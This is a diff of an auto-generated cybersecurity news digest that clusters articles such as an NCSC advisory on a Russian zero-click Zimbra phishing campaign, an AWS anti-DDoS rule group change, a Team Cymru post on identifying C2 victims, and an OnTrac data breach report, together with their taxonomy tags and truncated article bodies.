-  - Title: UK and partners expose Russian state-supported actors for new ‘zero-click’ phishing campaign targeting Western organisations
-  - Published: 2026-07-23T12:00:00+00:00
-  - Link: https://www.ncsc.gov.uk/news/uk-and-partners-expose-russian-state-supported-actors-for-new-zero-click-phishing-campaign
-  - Summary: GCHQ’s National Cyber Security Centre and international partners issue warning as ‘LAUNDRY BEAR’ cyber threat group exposed for targeted phishing campaign
+- **Risky Business News** (practitioner_analysis)
+  - Title: Risky Bulletin: A JSON RCE bug is about to rock the Java world
+  - Published: 2026-07-27T06:28:36+00:00
+  - Link: https://risky.biz/RBNEWS592/
+  - Summary: A JSON bug is about to rock the Java world, scam compounds continue in Myanmar despite the junta crackdown, and Google has a new APT naming scheme.
 
 ### Cluster 2612753693 — score 9
 
@@ -2960,6 +2894,49 @@ Not everything our honeypots detect is an attack. Sometimes it is just "odd traf
   - Link: https://isc.sans.edu/diary/rss/33172
   - Summary: Not everything our honeypots detect is an attack. Sometimes it is just "odd traffic", and this is one example: Our "First Seen" list currently includes "http://detectportal.firefox.co m/success.txt" as one of the new URLs detected by our honeypots. The hostname "detectportal" kind of gives away what is happening here.
 
+### Cluster 574ebfebeb — score 9
+
+- Title: UK and partners expose Russian state-supported actors for new ‘zero-click’ phishing campaign targeting Western organisations
+- Source: NCSC UK (government_authoritative)
+- Published: 2026-07-23T12:00:00+00:00
+- Link: https://www.ncsc.gov.uk/news/uk-and-partners-expose-russian-state-supported-actors-for-new-zero-click-phishing-campaign
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: apt_espionage, phishing_social_eng
+- affected_industries: critical_infrastructure, education, government
+- content_type: news_report
+- confidence_tier: tier_1_government
+
+#### Primary article taxonomy
+- threat_categories: phishing_social_eng, apt_espionage
+- affected_industries: government, critical_infrastructure, education
+- content_type: news_report
+- confidence_tier: tier_1_government
+
+#### Summary
+
+```
+GCHQ’s National Cyber Security Centre and international partners issue warning as ‘LAUNDRY BEAR’ cyber threat group exposed for targeted phishing campaign
+```
+
+#### Full body
+
+```
+News Download & print article PDF Download & print article PDF UK and partners expose Russian state-supported actors for new ‘zero-click’ phishing campaign targeting Western organisations GCHQ’s National Cyber Security Centre and international partners issue warning as ‘LAUNDRY BEAR’ cyber threat group exposed for targeted phishing campaign Russian state-supported actors develop new technique to target Western email platforms and gain persistent access to compromised networks Organisations provided with trusted advice and support to protect sensitive data in the face of evolving cyber threats Russian state-supported cyber actors have targeted Western organisations with a malicious campaign which uses a zero-click exploit coined “beehive” (or “ Ulej ”) to steal emails, the UK has warned. Today, the National Cyber Security Centre – a part of GCHQ – alongside cyber security agencies in 15 countries, has exposed activities of LAUNDRY BEAR, an advanced persistent threat group who specialise in the covert acquisition of email data. Since July 2025, LAUNDRY BEAR has successfully targeted and stolen sensitive email information from organisations that use Zimbra Collaboration Suite (ZCS) software. US organisations have been targeted in sectors including defence, government, education, energy, law enforcement, media, NGOs and technology. In a new joint advisory , the NCSC and partners warn LAUNDRY BEAR’s ongoing campaign is indicative of espionage and almost certainly carried out with Russian state support. Unlike traditional phishing campaigns, “beehive” allows the threat actors to gain extensive and sustained access to emails without requiring a user’s input. Instead of clicking a link or opening a file, the user only has to view a malicious email within a vulnerable version of the ZCS webmail service to be compromised. Organisations that use ZCS are urged to follow the mitigation advice, including to immediately patch vulnerabilities and improve network monitoring capabilities. The cyber agencies caution that it is likely “beehive” could be adapted to exploit other vulnerabilities. As more organisations update their ZCS software, it is very likely that the group will also look to target other email systems that Western organisations use. The NCSC recommends all UK organisations should sign up to the free Early Warning service for malicious network activity notifications. The government is committed to raising cyber resilience across the UK to protect businesses and safeguard growth. Earlier this month, businesses from every corner of the British economy joined a pledge publicly committing to strengthen their defences in the face of a fast-evolving threat. Today’s action shows we’re working hand-in-hand with our allies to expose Russian state-supported hackers targeting Western organisations. It’s particularly concerning that these thugs tested their methods on victims in Ukraine, before targeting members of NATO. Organisations across the UK should sign up to NCSC’s Early Warning service to ensure they can quickly secure their systems against similar activity. Security Minister, Dan Jarvis MBE This phishing campaign demonstrates how hostile actors will ruthlessly adapt techniques and exploit vulnerable technology in pursuit of their aims to steal sensitive information from Western organisations. With our international partners, we strongly encourage organisations to familiarise themselves with the ‘zero-click’ techniques described in the advisory which could be used against other platforms, and act on the mitigation advice. We will continue to call out malicious cyber activity supported by the Russian state and urge everyone to follow NCSC guidance to raise resilience, including steps to strengthen online account security. Beth Hopkins CMG, NCSC Chief Operating Officer The advisory highlights how these malicious cyber techniques were extensively trialled on Ukrainian victims before use against members of NATO, which is part of a growi
+```
+
+#### Corroborating sources (1)
+
+- **NCSC UK** (government_authoritative)
+  - Title: UK and partners expose Russian state-supported actors for new ‘zero-click’ phishing campaign targeting Western organisations
+  - Published: 2026-07-23T12:00:00+00:00
+  - Link: https://www.ncsc.gov.uk/news/uk-and-partners-expose-russian-state-supported-actors-for-new-zero-click-phishing-campaign
+  - Summary: GCHQ’s National Cyber Security Centre and international partners issue warning as ‘LAUNDRY BEAR’ cyber threat group exposed for targeted phishing campaign
+
 ### Cluster d78beff971 — score 9
 
 - Title: Inside Elastic InfoSec's agentic SOC: How we cut AI agent LLM calls by 60%
@@ -2998,6 +2975,49 @@ We run fourteen AI agents that triage Elastic InfoSec alerts. They were taking 1
   - Published: 2026-07-27T00:00:00+00:00
   - Link: https://www.elastic.co/security-labs/ai-agent-optimization-production-scale
   - Summary: We run fourteen AI agents that triage Elastic InfoSec alerts. They were taking 19 LLM calls to do work that needed 8. Here's the five-step optimization loop we run across the fleet, plus the prompt template you can use with any AI assistant.
+
+### Cluster a1ac00af72 — score 9
+
+- Title: AWS Shield Advanced is embracing the AWS WAF Anti-DDoS managed rule group: What changes and how to prepare
+- Source: AWS Security Blog (cloud_identity_infrastructure)
+- Published: 2026-07-27T19:01:23+00:00
+- Link: https://aws.amazon.com/blogs/security/aws-shield-advanced-is-embracing-the-aws-waf-anti-ddos-managed-rule-group-what-changes-and-how-to-prepare/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: ddos
+- affected_products: AWS
+- content_type: news_report
+- confidence_tier: tier_2_operator
+
+#### Primary article taxonomy
+- threat_categories: ddos
+- affected_products: AWS
+- content_type: news_report
+- confidence_tier: tier_2_operator
+
+#### Summary
+
+```
+Application-layer distributed denial of service (DDoS) attacks are difficult to detect because they closely resemble legitimate traffic. HTTP request floods are now among the most common vectors targeting web applications, using valid-looking requests that blend in with normal user activity. In June 2025, AWS launched the AWS WAF Anti-DDoS managed rule group, built specifically for […]
+```
+
+#### Full body
+
+```
+AWS Security Blog AWS Shield Advanced is embracing the AWS WAF Anti-DDoS managed rule group: What changes and how to prepare Application-layer distributed denial of service (DDoS) attacks are difficult to detect because they closely resemble legitimate traffic. HTTP request floods are now among the most common vectors targeting web applications, using valid-looking requests that blend in with normal user activity. In June 2025, AWS launched the AWS WAF Anti-DDoS managed rule group , built specifically for application-layer (L7) DDoS protection. AWS Shield Advanced is adopting it as the default application-layer protection, and in time as the only one. On July 27, AWS Shield Advanced begins adding the Anti-DDoS managed rule group to eligible web access control lists (ACLs) in Count mode. It will not cause any interruption to your traffic alongside your existing L7 automatic mitigation and WAF rules. In this blog post, we provide details regarding the Anti-DDoS managed rule group and when the change is expected to reach your web ACLs. You will understand the phases and steps that you need to take before the finish date, including how the monitoring and metrics will change. Anti-DDoS managed rule group features The Anti-DDoS managed rule group builds on what Shield Advanced automatic mitigation already provides. It profiles your traffic, learns what normal traffic looks like for your application, and establishes a baseline in minutes rather than hours. When an attack starts, it reacts within seconds and there are no health checks to configure. The rule group adds a Challenge action to the Block and Count actions you already use. Challenge decisions are driven by the AMR labels that mark the suspicion level of each inspected request. One option is a silent browser challenge, which has a background verification that runs in the visitor’s browser with no interstitial page, so legitimate users are never interrupted while automated traffic is filtered out. You can also exclude workload paths that don’t support Challenge, which fall back to Block mitigations instead. Sensitivity is configurable to Low, Medium, or High, and you set it separately for Block and Challenge. Block and Challenge are tuned independently; meaning you can run Challenge at high sensitivity to catch more suspicious traffic while keeping Block low to avoid dropping legitimate requests or reverse it for a stricter posture. The rest is about cost and visibility: It uses less capacity than before. The rule group needs 50 web ACL capacity units (WCUs), down from the 150 the previous protection required, providing you with capacity for the rest of your rules. The dashboard ships in the AWS Management Console for AWS WAF. It’s there now, showing live DDoS events, match metrics, and the top URIs, geographies, and IP addresses driving traffic. It labels everything it inspects. Requests get labels for event-detected , graduated suspicion levels, and specific rules. Match on those labels in your own AWS WAF rules when you need logic the rule group doesn’t cover. You don’t pay for the attack traffic. During active mitigation, blocked DDoS requests drop out of your monthly count. That exclusion covers AWS WAF request fees, Anti-DDoS managed rule group request fees, and Shield Advanced request charges. AWS Shield Advanced isn’t required to use any of these features. Shield Advanced subscribers get the rule group included with AWS WAF and any customer can turn it on independently. See AWS WAF pricing for more information on costs. Implementation details Shield Advanced upgrades application-layer DDoS protection in five phases. The following dates are when AWS will act automatically, not the earliest date when you can act. After the rule group is deployed in Count mode on July 27, 2026, you can begin migrating right away rather than waiting for the October auto-upgrade. There’s no window where protection lapses. Your current automatic mitigation stays active through every phase u
+```
+
+#### Corroborating sources (1)
+
+- **AWS Security Blog** (cloud_identity_infrastructure)
+  - Title: AWS Shield Advanced is embracing the AWS WAF Anti-DDoS managed rule group: What changes and how to prepare
+  - Published: 2026-07-27T19:01:23+00:00
+  - Link: https://aws.amazon.com/blogs/security/aws-shield-advanced-is-embracing-the-aws-waf-anti-ddos-managed-rule-group-what-changes-and-how-to-prepare/
+  - Summary: Application-layer distributed denial of service (DDoS) attacks are difficult to detect because they closely resemble legitimate traffic. HTTP request floods are now among the most common vectors targeting web applications, using valid-looking requests that blend in with normal user activity. In June 2025, AWS launched the AWS WAF Anti-DDoS managed rule group, built specifically for […]
 
 ### Cluster 9454090822 — score 9
 
@@ -3136,6 +3156,45 @@ GitHub and the Python Package Index (PyPI) have introduced new policies meant to
   - Link: https://www.securityweek.com/new-github-pypi-policies-boost-supply-chain-security/
   - Summary: Dependabot gets a three-day cooldown window before opening pull requests, and PyPI rejects file uploads to releases older than 14 days. The post New GitHub, PyPI Policies Boost Supply Chain Security appeared first on SecurityWeek .
 
+### Cluster bcd8bf40a8 — score 9
+
+- Title: From C2 Detection to Possible Victim Identification
+- Source: Team Cymru (ransomware_ecrime_financial_crime)
+- Published: 2026-07-27T13:41:45+00:00
+- Link: https://www.team-cymru.com/post/c2-detection-to-victim-identification
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- content_type: news_report
+- confidence_tier: tier_2_operator
+
+#### Primary article taxonomy
+- content_type: news_report
+- confidence_tier: tier_2_operator
+
+#### Summary
+
+```
+Discover how to transition from C2 detection to possible victim identification. Improve your cyber incident response by tracking attacker infrastructure to compromised systems.
+```
+
+#### Full body
+
+```
+All Blog Internet Weather Threat Research Threat Intelligence 101 Josh Picolet 3 min read July 27, 2026 From C2 Detection to Possible Victim Identification One of the questions I hear most often is: Can Team Cymru identify possible victims of malicious infrastructure? The answer is yes—when we have sufficient network telemetry covering the infrastructure involved. It’s an important nuance. Identifying command-and-control infrastructure is only one part of the problem. The next—and often more valuable—question is whether we can observe systems consistently communicating with that infrastructure in a way that may indicate infection or compromise. Turning controller intelligence into victim insight The Total Insights Feed includes behavioral tags designed to help answer that question. When an IP address is identified as command-and-control infrastructure, we can evaluate available NetFlow observations for sustained, high-confidence interactions with that controller. When the behavior meets our analytic criteria, the communicating IP may be tagged as a possible bot associated with the relevant malware or C2 family. For example, an IP interacting with infrastructure attributed to the Sliver C2 framework could receive a tag such as sliver-bot. This creates two practical workflows: A security team can check its organization’s IP ranges against the Total Insights Feed to identify systems that may have communicated with known malicious controllers. An analyst investigating a controller can review associated bot tags to identify potential downstream victims and better understand the infrastructure’s operational reach. These observations should not be treated as definitive proof of compromise. They are high-value investigative leads that can help teams prioritize validation, containment, and response. Why this changes the investigation Traditional infrastructure intelligence often stops at identifying a suspicious server, domain, or open service. That is useful—but defenders still have to determine whether the infrastructure affected them. Behavioral tagging moves the investigation closer to the outcome security teams actually need: understanding whether a system within their environment may be communicating with known attacker infrastructure. Instead of beginning with a complex sequence of searches, pivots, and enrichment steps, a customer can evaluate its network ranges against intelligence that has already been classified and contextualized. For an MSSP, SOC, incident-response team, or threat-intelligence function, this can significantly reduce the time between infrastructure discovery and action. Detection becomes more valuable over time The value compounds as new command-and-control families are identified. Each time our detections team develops a reliable way to identify a new family of malicious infrastructure, we can begin evaluating the telemetry available around it. That may reveal likely related infrastructure, higher-tier management, recurring communication patterns, and potential victim activity. This is not a single detection or one-time query. It is an incremental system of classification and labeling built across multiple forms of internet telemetry, including: NetFlow observations Open ports and service fingerprints Custom internet probes Infrastructure relationships Analyst-developed detections and validation We think that combination is important. Scanning can help identify infrastructure that looks like a controller. Network telemetry can help reveal how that infrastructure is actually being used. Without sufficient traffic visibility, a provider may be able to identify a possible C2 server but remain unable to observe meaningful interactions with it. With that visibility, infrastructure intelligence can begin to answer a much more consequential question: Who may be affected? Visibility is the foundation. This capability is ultimately grounded in data visibility. Detection logic, classification, and automation are ess
+```
+
+#### Corroborating sources (1)
+
+- **Team Cymru** (ransomware_ecrime_financial_crime)
+  - Title: From C2 Detection to Possible Victim Identification
+  - Published: 2026-07-27T13:41:45+00:00
+  - Link: https://www.team-cymru.com/post/c2-detection-to-victim-identification
+  - Summary: Discover how to transition from C2 detection to possible victim identification. Improve your cyber incident response by tracking attacker infrastructure to compromised systems.
+
 ### Cluster 7f4871768d — score 9
 
 - Title: Weekly Update 514: This Week in Data Breaches
@@ -3176,45 +3235,6 @@ The Origin Energy breach down here in Aus is all over the news this week, and as
   - Published: 2026-07-26T09:14:51+00:00
   - Link: https://www.troyhunt.com/weekly-update-514/
   - Summary: The Origin Energy breach down here in Aus is all over the news this week, and as with many breaches, it's multi-faceted. You've got them leading with "don't worry, your credit card is fine", the hacker leading with "they didn&
-
-### Cluster bcd8bf40a8 — score 9
-
-- Title: From C2 Detection to Possible Victim Identification
-- Source: Team Cymru (ransomware_ecrime_financial_crime)
-- Published: 2026-07-27T13:41:45+00:00
-- Link: https://www.team-cymru.com/post/c2-detection-to-victim-identification
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- content_type: news_report
-- confidence_tier: tier_2_operator
-
-#### Primary article taxonomy
-- content_type: news_report
-- confidence_tier: tier_2_operator
-
-#### Summary
-
-```
-Discover how to transition from C2 detection to possible victim identification. Improve your cyber incident response by tracking attacker infrastructure to compromised systems.
-```
-
-#### Full body
-
-```
-All Blog Internet Weather Threat Research Threat Intelligence 101 Josh Picolet 3 min read July 27, 2026 From C2 Detection to Possible Victim Identification One of the questions I hear most often is: Can Team Cymru identify possible victims of malicious infrastructure? The answer is yes—when we have sufficient network telemetry covering the infrastructure involved. It’s an important nuance. Identifying command-and-control infrastructure is only one part of the problem. The next—and often more valuable—question is whether we can observe systems consistently communicating with that infrastructure in a way that may indicate infection or compromise. Turning controller intelligence into victim insight The Total Insights Feed includes behavioral tags designed to help answer that question. When an IP address is identified as command-and-control infrastructure, we can evaluate available NetFlow observations for sustained, high-confidence interactions with that controller. When the behavior meets our analytic criteria, the communicating IP may be tagged as a possible bot associated with the relevant malware or C2 family. For example, an IP interacting with infrastructure attributed to the Sliver C2 framework could receive a tag such as sliver-bot. This creates two practical workflows: A security team can check its organization’s IP ranges against the Total Insights Feed to identify systems that may have communicated with known malicious controllers. An analyst investigating a controller can review associated bot tags to identify potential downstream victims and better understand the infrastructure’s operational reach. These observations should not be treated as definitive proof of compromise. They are high-value investigative leads that can help teams prioritize validation, containment, and response. Why this changes the investigation Traditional infrastructure intelligence often stops at identifying a suspicious server, domain, or open service. That is useful—but defenders still have to determine whether the infrastructure affected them. Behavioral tagging moves the investigation closer to the outcome security teams actually need: understanding whether a system within their environment may be communicating with known attacker infrastructure. Instead of beginning with a complex sequence of searches, pivots, and enrichment steps, a customer can evaluate its network ranges against intelligence that has already been classified and contextualized. For an MSSP, SOC, incident-response team, or threat-intelligence function, this can significantly reduce the time between infrastructure discovery and action. Detection becomes more valuable over time The value compounds as new command-and-control families are identified. Each time our detections team develops a reliable way to identify a new family of malicious infrastructure, we can begin evaluating the telemetry available around it. That may reveal likely related infrastructure, higher-tier management, recurring communication patterns, and potential victim activity. This is not a single detection or one-time query. It is an incremental system of classification and labeling built across multiple forms of internet telemetry, including: NetFlow observations Open ports and service fingerprints Custom internet probes Infrastructure relationships Analyst-developed detections and validation We think that combination is important. Scanning can help identify infrastructure that looks like a controller. Network telemetry can help reveal how that infrastructure is actually being used. Without sufficient traffic visibility, a provider may be able to identify a possible C2 server but remain unable to observe meaningful interactions with it. With that visibility, infrastructure intelligence can begin to answer a much more consequential question: Who may be affected? Visibility is the foundation. This capability is ultimately grounded in data visibility. Detection logic, classification, and automation are ess
-```
-
-#### Corroborating sources (1)
-
-- **Team Cymru** (ransomware_ecrime_financial_crime)
-  - Title: From C2 Detection to Possible Victim Identification
-  - Published: 2026-07-27T13:41:45+00:00
-  - Link: https://www.team-cymru.com/post/c2-detection-to-victim-identification
-  - Summary: Discover how to transition from C2 detection to possible victim identification. Improve your cyber incident response by tracking attacker infrastructure to compromised systems.
 
 ### Cluster 65bbcc1b2d — score 8
 
@@ -3453,22 +3473,18 @@ We tested two agentic SOC architectures in parallel across 36,822 real Agent Bui
 - Source: BleepingComputer (cyber_news_breach_reporting)
 - Published: 2026-07-24T19:55:01+00:00
 - Link: https://www.bleepingcomputer.com/news/security/ontrac-notifies-customers-of-data-breach-after-network-hack/
-- Fetch status: ok
+- Fetch status: not_attempted
 - Member count: 1
 - Corroborating source count: 1
 - Strong signals: (none)
 
 #### Cluster taxonomy (union across members)
-- threat_categories: data_breach, ransomware_extortion, supply_chain
-- actor_attribution: ShinyHunters
-- affected_industries: retail_ecommerce
+- threat_categories: data_breach
 - content_type: incident_report
 - confidence_tier: tier_4_news
 
 #### Primary article taxonomy
-- threat_categories: ransomware_extortion, supply_chain, data_breach
-- actor_attribution: ShinyHunters
-- affected_industries: retail_ecommerce
+- threat_categories: data_breach
 - content_type: incident_report
 - confidence_tier: tier_4_news
 
@@ -3476,12 +3492,6 @@ We tested two agentic SOC architectures in parallel across 36,822 real Agent Bui
 
 ```
 OnTrac parcel delivery company is informing that hackers breached its corporate network and may have accessed personal details belonging to its customers. [...]
-```
-
-#### Full body
-
-```
-OnTrac notifies customers of data breach after network hack By Bill Toulas July 24, 2026 03:55 PM 0 OnTrac parcel delivery company is informing that hackers breached its corporate network and may have accessed personal details belonging to its customers. The incident was detected on March 23, and an internal investigation revealed that the attacker accessed certain files between March 20 and 22. Apart from names, it is unclear what type of information was exposed, as the company redacted the data elements in the notification sample shared with authorities. OnTrac is a private American parcel-delivery company specializing in “last-mile” e-commerce deliveries, formed in 2021 from the merger of OnTrac Logistics and LaserShip. The firm operates at 102 locations across 35 states , covering roughly 70% of the U.S. population, and working with more than 7,000 independent delivery contractors. In response to the security incident, OnTrac contracted a third-party specialist to help determine the scope of the breach and took steps to “ensure the data described above was re-secured and not distributed.” This statement suggests a possible agreement between the firm and the attackers, typically a ransom payment, to make sure that the customer information is not leaked. "We are not aware of any fraud or publication of stolen information resulting from this incident, nor do we have any reason to believe any such misuse of information will occur," OnTrac says in the notification. To help exposed customers mitigate the risks that may arise from the exposure of their sensitive data, OnTrac is offering free-of-charge access to a 12-month credit monitoring and identity protection service via CyberScout, with a 90-day enrollment deadline. Recipients of the letter are also recommended to review their credit reports and account statements, and consider placing a free fraud alert or credit freeze if the risk is deemed significant. BleepingComputer has contacted OnTrac to learn more about the attack, the number of impacted clients, and whether a ransom was paid, but we have not heard back by publication time. At the time of writing, no ransomware or data extortion threat groups have taken responsibility for the attack. Test every layer before attackers do Security teams log 54% of successful attacks and alert on just 14%. The rest move through your environment unseen. The Picus whitepaper shows how breach and attack simulation tests your SIEM and EDR rules so threats stop slipping by detection. Get the whitepaper Related Articles: Ernst & Young discloses data breach after support system hack Healthtech firm Xolis suffers data breach impacting 1.4 million people Upbound says hack caused $13 million in fraudulent Acima leases Medtronic notifies customers impacted by ShinyHunters data breach LastPass confirms data breach in Klue supply chain attack
 ```
 
 #### Corroborating sources (1)
